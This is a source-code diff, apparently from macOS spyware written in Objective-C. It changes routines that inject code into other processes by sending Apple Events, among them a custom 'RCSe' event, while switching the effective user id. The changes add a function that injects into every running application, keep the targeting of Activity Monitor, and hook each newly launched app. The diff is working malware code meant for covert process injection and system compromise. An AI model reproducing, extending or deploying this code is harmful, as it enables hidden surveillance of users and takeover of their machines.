@@ -177,31 +177,38 @@ void lionSendEventToPid(pid_t pidP)
 {
   AEEventID eventID = 'load';
   int rUid = getuid();
-
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
+  
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
 
 #ifdef DEBUG_CORE
-  verboseLog(@"send event to application pid %d", pidP);
+  infoLog(@"send event to application pid %d", pidP);
 #endif
 
 #ifdef DEBUG_CORE
-  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+  infoLog(@"enter critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
 
   // trimming process u&g
-  seteuid(rUid);
-
+  seteuid(rUid); 
+  
+  [app setTimeout:1];
+  
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
+      
+#ifdef DEBUG_CORE
+  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
+#endif
 
   sleep(1);
-
+  
+  [app setTimeout:1];
+  
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
 
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
@@ -211,20 +218,20 @@ void lionSendEventToPid(pid_t pidP)
                        parameters: 'pido', pid, 0];
 
 #ifdef DEBUG_CORE
-  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+  infoLog(@"exit critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
 
   if (injectReply != nil) 
     {
-#ifdef DEBUG_CORE	
-      warnLog(@"unexpected injectReply: %@", injectReply);
+#ifdef DEBUG_CORE
+      infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
 #endif
     }
   else 
     {
 #ifdef DEBUG_CORE
-      verboseLog(@"injection done");
+      infoLog(@"injection done [%d]", pidP);
 #endif
     }
 
@@ -3462,7 +3469,11 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
           warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
 #endif
-          [self sendEventToPid: pActivityM];
+          NSNumber *thePid = [[NSNumber alloc] initWithInt: [pActivityM intValue]];
+          
+          [self sendEventToPid: thePid];
+          
+          [thePid release];
         }
       else 
         {
@@ -3472,6 +3483,9 @@ void lionSendEventToPid(pid_t pidP)
         }
     }
 #endif
+  
+  // inject all running apps in the ws
+  [self injectRunningApp];
   
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
@@ -3534,6 +3548,9 @@ void lionSendEventToPid(pid_t pidP)
   int rUid = getuid();
   int maxRetry = 10;
 
+  if (thePid == nil)
+    return;
+
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
   // On lion fork to sendEvents without problem
@@ -3543,8 +3560,7 @@ void lionSendEventToPid(pid_t pidP)
       NSMutableArray *args = [NSMutableArray array];
       NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
 
-      /* set arguments */
-      [args addObject:[[[NSBundle mainBundle] executablePath] lastPathComponent]];
+      //argv
       [args addObject: @"-p"];
       [args addObject: pidStr];
       [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
@@ -3557,7 +3573,7 @@ void lionSendEventToPid(pid_t pidP)
       [aTask launch];
       [aTask release];
       [pidStr release];
-
+      
 #ifdef DEBUG_CORE
       verboseLog(@"task launched");
 #endif
@@ -3594,18 +3610,19 @@ void lionSendEventToPid(pid_t pidP)
   if (eUid != rUid)
     seteuid(rUid);
 
+  [app setTimeout: 1];
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
 
   sleep(1);
 
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
+  
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
-
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
   id injectReply = [app sendEvent: 'RCSe'
                                id: eventID
                        parameters: 'pido', pid, 0];
@@ -3645,9 +3662,40 @@ void lionSendEventToPid(pid_t pidP)
 #endif
     }
 
-  [thePid release];
-
   [pool release];  
+}
+
+- (void)injectRunningApp
+{
+  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
+  
+  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
+  
+  NSArray *apps = [ws runningApplications];
+  
+  if (apps && [apps count]) 
+    {
+      for (int i=0; i<[apps count]; i++) 
+        {
+          NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
+          
+          pid_t tmpPid = [app processIdentifier];
+          
+          NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+          
+#ifdef DEBUG_CORE
+        infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
+              [app localizedName], [app processIdentifier]);
+#endif
+          [self sendEventToPid:thePid]; 
+          
+          [thePid release];
+          
+          usleep(500);
+        }
+    }
+    
+  [pool release];
 }
 
 - (BOOL)isCrisisHookApp: (NSString*)appName
@@ -3709,6 +3757,12 @@ void lionSendEventToPid(pid_t pidP)
   
   NSDictionary *appInfo = [notification userInfo];
 
+  if (appInfo == nil)
+    {
+      [pool release];
+      return;
+    }
+  
 #ifdef DEBUG_CORE
   infoLog(@"running new notificaion on app %@ ", appInfo);
 #endif
@@ -3731,7 +3785,6 @@ void lionSendEventToPid(pid_t pidP)
     return;
   }
   
-
   if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
     {
 #ifdef DEBUG_CORE
@@ -3750,12 +3803,14 @@ void lionSendEventToPid(pid_t pidP)
       infoLog(@"sendEventToPid");
 #endif
       // temporary thread for fixing euid/uid escalation
-      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
-                               toTarget: self 
-                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+      pid_t tmpPid =  [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] intValue];
+      NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+     
+     [self sendEventToPid: thePid];
+     
+     [thePid release];
     }
     
-  
   [pool release];
 }
 
